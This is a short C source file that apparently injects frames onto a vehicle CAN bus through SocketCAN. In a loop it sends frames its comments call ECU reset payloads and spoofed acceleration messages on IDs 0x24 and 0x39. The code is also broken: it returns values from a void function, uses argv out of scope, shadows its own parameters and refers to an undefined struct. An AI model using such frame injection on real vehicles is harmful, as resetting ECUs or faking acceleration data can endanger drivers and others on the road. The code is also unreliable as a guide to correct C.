#include "all_headers.h"


void msq_msq(int socket, struct sockaddr_can *addr, int canid, int time_diff) {
    char *interface = argv[1];
    int ECUcan_id = (int)strtol(argv[2], NULL, 16);
    int interval = atoi (argv[4]);

    int s;
    struct sockaddr_can addr;
    struct ifreq ifr;
    struct can_frame frame;

    if ((s = socket(PF_CAN, SOCK_RAW, CAN_RAW)) < 0){
        perror("Socket fail");
        return 1;
    }

    strcpy(ifr.ifr_name, interface);
    ioctl(s, SIOCGIFINDEX, &ifr);

    addr.can_family = AF_CAN;
    addr.can_ifindex = ifr.ifr_ifindex;

    if (bind(s, (struct sockaddr *)&addr, sizeof(addr)) < 0){
        perror("Bind fail");
        return 1;
    }


    do{
        //send ECURESET
        //resetpayload1
        frame.can_id = canid;
        frame.can_dlc = 3;
        memcpy(frame.data, msq.payload1, 3);
        send_can_frame(s, frame, addr);
        //resetpayload2
        frame.can_id = canid;
        frame.can_dlc = 3;
        memcpy(frame.data, msq.payload2, 3);
        send_can_frame(s, frame, addr);

        //sned ACCEL
        //accelpayload1
        frame.can_id = 0x24;
        frame.can_dlc = 8;
        memcpy(frame.data, msq.payload3, 8);
        send_can_frame(s, frame, addr);
        //acclepayload2
        frame.can_id = 0x39;
        frame.can_dlc = 8;
        memcpy(frame.data, msq.payload4, 8);
        send_can_frame(s, frame, addr);

        if (time_diff == 0) break;

        usleep(time_diff * 10000);
    } while (1);

    close(s);
    return 0;
}